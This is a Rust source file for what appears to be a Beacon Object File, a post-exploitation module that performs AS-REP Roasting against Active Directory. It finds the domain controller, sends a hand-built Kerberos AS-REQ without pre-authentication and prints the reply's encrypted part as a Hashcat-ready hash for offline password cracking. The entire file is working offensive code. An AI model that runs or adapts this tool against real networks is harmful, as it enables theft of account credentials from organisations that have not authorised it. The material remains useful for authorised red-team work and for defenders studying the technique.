//! # AS-REP Roasting BOF
//!
//! Requests an AS-REP for users with Kerberos pre-authentication disabled
//! and outputs the encrypted part as a Hashcat-compatible hash for offline
//! cracking. Supports RC4 and AES encryption types.
//!
//! ## MITRE ATT&CK
//! - T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting
//!
//! ## Arguments
//! - `/user:USER` - Target username (required)
//! - `/domain:DOMAIN` - Target domain (auto-detected if omitted)
//! - `/dc:DC` - Domain controller hostname or IP (auto-detected if omitted)

#![no_std]

use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Networking::WinSock::*;

unsafe extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
}

fn asn_tag_len(tag: u8, data: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    let l = data.len();
    if l < 0x80 {
        out.push(l as u8);
    } else if l < 0x100 {
        out.push(0x81);
        out.push(l as u8);
    } else {
        out.push(0x82);
        out.push((l >> 8) as u8);
        out.push(l as u8);
    }
    out.extend_from_slice(data);
    out
}
fn asn_seq(c: &[&[u8]]) -> Vec<u8> {
    let mut d = Vec::new();
    for x in c {
        d.extend_from_slice(x);
    }
    asn_tag_len(0x30, &d)
}
fn asn_ctx(t: u8, d: &[u8]) -> Vec<u8> {
    asn_tag_len(0xa0 | t, d)
}
fn asn_app(t: u8, d: &[u8]) -> Vec<u8> {
    asn_tag_len(0x60 | t, d)
}
fn asn_int(v: i64) -> Vec<u8> {
    if v == 0 {
        return vec![0x02, 0x01, 0x00];
    }
    let mut b = Vec::new();
    let mut val = v;
    if v > 0 {
        while val > 0 {
            b.push((val & 0xff) as u8);
            val >>= 8;
        }
        b.reverse();
        if b[0] & 0x80 != 0 {
            b.insert(0, 0);
        }
    } else {
        while val < -1 {
            b.push((val & 0xff) as u8);
            val >>= 8;
        }
        b.push((val & 0xff) as u8);
        b.reverse();
    }
    let mut out = vec![0x02, b.len() as u8];
    out.extend_from_slice(&b);
    out
}
fn asn_str(s: &str) -> Vec<u8> {
    asn_tag_len(0x1b, s.as_bytes())
}
fn asn_bit(d: &[u8]) -> Vec<u8> {
    let mut o = vec![0x03];
    let l = d.len() + 1;
    if l < 0x80 {
        o.push(l as u8);
    } else {
        o.push(0x81);
        o.push(l as u8);
    }
    o.push(0x00);
    o.extend_from_slice(d);
    o
}
fn asn_time(s: &str) -> Vec<u8> {
    asn_tag_len(0x18, s.as_bytes())
}
fn asn_oct(d: &[u8]) -> Vec<u8> {
    asn_tag_len(0x04, d)
}
fn asn_ctx_int(t: u8, v: i64) -> Vec<u8> {
    let i = asn_int(v);
    asn_ctx(t, &i)
}
fn asn_ctx_str(t: u8, s: &str) -> Vec<u8> {
    let v = asn_str(s);
    asn_ctx(t, &v)
}

struct Asn {
    class: u8,
    tag: u32,
    value: Vec<u8>,
    children: Vec<Asn>,
}

fn parse_asn(data: &[u8]) -> Option<Asn> {
    let (e, _) = parse_one(data, 0)?;
    Some(e)
}

fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> {
    if pos >= data.len() {
        return None;
    }
    let b = data[pos];
    pos += 1;
    let class = (b >> 6) & 0x03;
    let constructed = (b & 0x20) != 0;
    let mut tag = (b & 0x1F) as u32;
    if tag == 0x1F {
        tag = 0;
        loop {
            if pos >= data.len() {
                return None;
            }
            let b = data[pos];
            pos += 1;
            tag = (tag << 7) | (b & 0x7F) as u32;
            if b & 0x80 == 0 {
                break;
            }
        }
    }
    if pos >= data.len() {
        return None;
    }
    let lb = data[pos];
    pos += 1;
    let length = match lb.cmp(&0x80) {
        core::cmp::Ordering::Less => lb as usize,
        core::cmp::Ordering::Equal => return None,
        core::cmp::Ordering::Greater => {
            let n = (lb & 0x7F) as usize;
            if pos + n > data.len() {
                return None;
            }
            let mut l = 0;
            for i in 0..n {
                l = (l << 8) | data[pos + i] as usize;
            }
            pos += n;
            l
        }
    };
    if pos + length > data.len() {
        return None;
    }
    let value = data[pos..pos + length].to_vec();
    let children = if constructed {
        parse_children(&value)
    } else {
        Vec::new()
    };
    Some((
        Asn {
            class,
            tag,
            value,
            children,
        },
        pos + length,
    ))
}

fn parse_children(data: &[u8]) -> Vec<Asn> {
    let mut c = Vec::new();
    let mut p = 0;
    while p < data.len() {
        if let Some((ch, np)) = parse_one(data, p) {
            c.push(ch);
            p = np;
        } else {
            break;
        }
    }
    c
}

fn find_ctx(asn: &Asn, tag: u32) -> Option<&Asn> {
    asn.children.iter().find(|c| c.class == 2 && c.tag == tag)
}
fn get_int(asn: &Asn) -> i64 {
    let d = &asn.value;
    if d.is_empty() {
        return 0;
    }
    let mut v = if d[0] & 0x80 != 0 { -1i64 } else { 0i64 };
    for &b in d {
        v = (v << 8) | b as i64;
    }
    v
}
fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
    if let Some(pos) = params.find(name) {
        let a = &params[pos + name.len()..];
        let e = a.find(' ').unwrap_or(a.len());
        let v = &a[..e];
        if !v.is_empty() {
            return Some(v);
        }
    }
    None
}

fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut wsa = core::mem::zeroed::<WSADATA>();
        WSAStartup(0x0202, &mut wsa);
        let mut sc = Vec::with_capacity(server.len() + 1);
        sc.extend_from_slice(server.as_bytes());
        sc.push(0);
        let mut hints = core::mem::zeroed::<ADDRINFOA>();
        hints.ai_family = AF_INET as i32;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        let mut result: *mut ADDRINFOA = core::ptr::null_mut();
        if getaddrinfo(
            sc.as_ptr(),
            c"88".as_ptr() as *const u8,
            &hints,
            &mut result,
        ) != 0
        {
            WSACleanup();
            return None;
        }
        let mut sock: SOCKET = INVALID_SOCKET;
        let mut ptr = result;
        while !ptr.is_null() {
            let ai = &*ptr;
            sock = socket(ai.ai_family, ai.ai_socktype, ai.ai_protocol);
            if sock != INVALID_SOCKET {
                if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 {
                    break;
                }
                closesocket(sock);
                sock = INVALID_SOCKET;
            }
            ptr = ai.ai_next;
        }
        freeaddrinfo(result);
        if sock == INVALID_SOCKET {
            WSACleanup();
            return None;
        }
        let lb = (data.len() as u32).to_be_bytes();
        send(sock, lb.as_ptr(), 4, 0);
        send(sock, data.as_ptr(), data.len() as i32, 0);
        let mut sb = [0u8; 4];
        if recv(sock, sb.as_mut_ptr(), 4, 0) < 4 {
            closesocket(sock);
            WSACleanup();
            return None;
        }
        let rs = (u32::from_be_bytes(sb) & 0x7fffffff) as usize;
        if rs == 0 || rs > 1024 * 1024 {
            closesocket(sock);
            WSACleanup();
            return None;
        }
        let mut resp = vec![0u8; rs];
        let mut rcvd = 0;
        while rcvd < rs {
            let n = recv(sock, resp.as_mut_ptr().add(rcvd), (rs - rcvd) as i32, 0);
            if n <= 0 {
                break;
            }
            rcvd += n as usize;
        }
        closesocket(sock);
        WSACleanup();
        if rcvd == rs { Some(resp) } else { None }
    }
}

fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        let netapi = {
            let h = GetModuleHandleA(c"NETAPI32".as_ptr() as *const u8);
            if h.is_null() {
                LoadLibraryA(c"NETAPI32".as_ptr() as *const u8)
            } else {
                h
            }
        };
        if netapi.is_null() {
            return None;
        }
        #[repr(C)]
        struct DcInfo {
            dc_name: *mut u8,
            dc_addr: *mut u8,
            dc_addr_type: u32,
            guid: [u8; 16],
            domain: *mut u8,
            forest: *mut u8,
            flags: u32,
            site: *mut u8,
            client_site: *mut u8,
        }
        type DsGetDcFn = unsafe extern "system" fn(
            *const u8,
            *const u8,
            *const c_void,
            *const u8,
            u32,
            *mut *mut DcInfo,
        ) -> u32;
        type FreeFn = unsafe extern "system" fn(*mut c_void) -> u32;
        let ds: DsGetDcFn = core::mem::transmute(GetProcAddress(
            netapi,
            c"DsGetDcNameA".as_ptr() as *const u8,
        ));
        let fr: FreeFn = core::mem::transmute(GetProcAddress(
            netapi,
            c"NetApiBufferFree".as_ptr() as *const u8,
        ));
        let mut info: *mut DcInfo = core::ptr::null_mut();
        if ds(
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            0x40000010,
            &mut info,
        ) != 0
        {
            return None;
        }
        if info.is_null() {
            return None;
        }
        let domain = cstr_to_string((*info).domain);
        let dc = cstr_to_string((*info).dc_name);
        fr(info as *mut c_void);
        Some((domain, String::from(dc.trim_start_matches('\\'))))
    }
}

fn cstr_to_string(ptr: *const u8) -> String {
    if ptr.is_null() {
        return String::new();
    }
    unsafe {
        let mut l = 0;
        while *ptr.add(l) != 0 {
            l += 1;
        }
        String::from_utf8_lossy(core::slice::from_raw_parts(ptr, l)).into_owned()
    }
}

fn bytes_to_hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for &v in b {
        s.push(if (v >> 4) < 10 {
            (b'0' + (v >> 4)) as char
        } else {
            (b'a' + (v >> 4) - 10) as char
        });
        s.push(if (v & 0xf) < 10 {
            (b'0' + (v & 0xf)) as char
        } else {
            (b'a' + (v & 0xf) - 10) as char
        });
    }
    s
}

unsafe extern "system" {
    fn GetSystemTime(st: *mut SYSTEMTIME);
}

fn get_future_time(hours: u16) -> String {
    unsafe {
        let mut st = core::mem::zeroed::<SYSTEMTIME>();
        GetSystemTime(&mut st);
        st.wHour += hours;
        if st.wHour >= 24 {
            st.wHour -= 24;
            st.wDay += 1;
        }
        alloc::format!(
            "{:04}{:02}{:02}{:02}{:02}{:02}Z",
            st.wYear,
            st.wMonth,
            st.wDay,
            st.wHour,
            st.wMinute,
            st.wSecond
        )
    }
}

fn build_asrep_req(user: &str, domain: &str) -> Vec<u8> {
    let kdc_opts = 0x40800000u32.to_be_bytes(); // forwardable + renewable
    let cname = asn_seq(&[&asn_ctx_int(0, 1), &asn_ctx(1, &asn_seq(&[&asn_str(user)]))]);
    let sname = asn_seq(&[
        &asn_ctx_int(0, 2),
        &asn_ctx(1, &asn_seq(&[&asn_str("krbtgt"), &asn_str(domain)])),
    ]);
    let till = get_future_time(24);
    let etypes = asn_seq(&[&asn_int(23), &asn_int(18), &asn_int(17)]);
    let pac = asn_seq(&[
        &asn_ctx_int(1, 128),
        &asn_ctx(2, &asn_oct(&[0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01])),
    ]);

    let body = asn_seq(&[
        &asn_ctx(0, &asn_bit(&kdc_opts)),
        &asn_ctx(1, &cname),
        &asn_ctx_str(2, domain),
        &asn_ctx(3, &sname),
        &asn_ctx(5, &asn_time(&till)),
        &asn_ctx_int(7, 12345),
        &asn_ctx(8, &etypes),
    ]);

    asn_app(
        10,
        &asn_seq(&[
            &asn_ctx_int(1, 5),
            &asn_ctx_int(2, 10),
            &asn_ctx(3, &asn_seq(&[&pac])),
            &asn_ctx(4, &body),
        ]),
    )
}

fn extract_asrep_hash(response: &[u8], user: &str, domain: &str) -> Option<String> {
    let root = parse_asn(response)?;

    if root.tag == 30 {
        let body = root.children.first()?;
        if let Some(err) = find_ctx(body, 6) {
            if let Some(code) = err.children.first() {
                let c = get_int(code);
                match c {
                    6 => {
                        eprintln!(
                            "[X] KDC_ERR_C_PRINCIPAL_UNKNOWN - user '{}' not found",
                            user
                        );
                    }
                    25 => {
                        eprintln!(
                            "[X] KDC_ERR_PREAUTH_REQUIRED - user '{}' has pre-auth enabled",
                            user
                        );
                    }
                    _ => {
                        eprintln!("[X] Kerberos error: {}", c);
                    }
                }
            }
        }
        return None;
    }

    if root.tag != 11 {
        eprintln!("[X] Unexpected response tag: {}", root.tag);
        return None;
    }

    let body = root.children.first()?;
    let enc_part_ctx = find_ctx(body, 6)?;
    let enc_data = enc_part_ctx.children.first()?;

    let etype = find_ctx(enc_data, 0)
        .and_then(|c| c.children.first())
        .map(|c| get_int(c) as i32)
        .unwrap_or(0);
    let cipher = find_ctx(enc_data, 2)
        .and_then(|c| c.children.first())
        .map(|c| &c.value)?;

    if cipher.is_empty() {
        return None;
    }

    if etype == 23 {
        let checksum = bytes_to_hex(&cipher[..16.min(cipher.len())]);
        let rest = bytes_to_hex(&cipher[16.min(cipher.len())..]);
        Some(alloc::format!(
            "$krb5asrep$23${}@{}:{}${}",
            user,
            domain.to_ascii_uppercase(),
            checksum,
            rest
        ))
    } else if etype == 18 {
        let checksum = bytes_to_hex(&cipher[cipher.len().saturating_sub(12)..]);
        let rest = bytes_to_hex(&cipher[..cipher.len().saturating_sub(12)]);
        Some(alloc::format!(
            "$krb5asrep$18${}@{}:{}${}",
            user,
            domain.to_ascii_uppercase(),
            checksum,
            rest
        ))
    } else if etype == 17 {
        let checksum = bytes_to_hex(&cipher[cipher.len().saturating_sub(12)..]);
        let rest = bytes_to_hex(&cipher[..cipher.len().saturating_sub(12)]);
        Some(alloc::format!(
            "$krb5asrep$17${}@{}:{}${}",
            user,
            domain.to_ascii_uppercase(),
            checksum,
            rest
        ))
    } else {
        eprintln!("[X] Unsupported encryption type: {}", etype);
        None
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: AS-REP Roasting\n");

    if len == 0 {
        eprintln!("[X] /user:X required");
        return;
    }

    let mut parser = DataParser::new(args, len);
    let params = String::from(parser.get_str());

    let user = match get_param(&params, "/user:") {
        Some(u) => u,
        None => {
            eprintln!("[X] /user:X must be supplied!");
            return;
        }
    };
    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");

    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        (String::from(d), String::from(c))
    } else {
        match get_domain_info() {
            Some((d, c)) => (
                domain_arg.map(String::from).unwrap_or(d),
                dc_arg.map(String::from).unwrap_or(c),
            ),
            None => {
                eprintln!("[X] Could not retrieve domain info! Use /domain: and /dc:");
                return;
            }
        }
    };

    println!(
        "[*] Building AS-REQ (w/o preauth) for: '{}\\{}'",
        domain, user
    );

    let as_req = build_asrep_req(user, &domain);

    let response = match send_to_kdc(&dc, &as_req) {
        Some(r) => r,
        None => {
            eprintln!("[X] Failed to communicate with KDC at {}:88", dc);
            return;
        }
    };

    if let Some(hash) = extract_asrep_hash(&response, user, &domain) {
        println!("[+] AS-REP hash:\n\n{}\n", hash);
    }
}
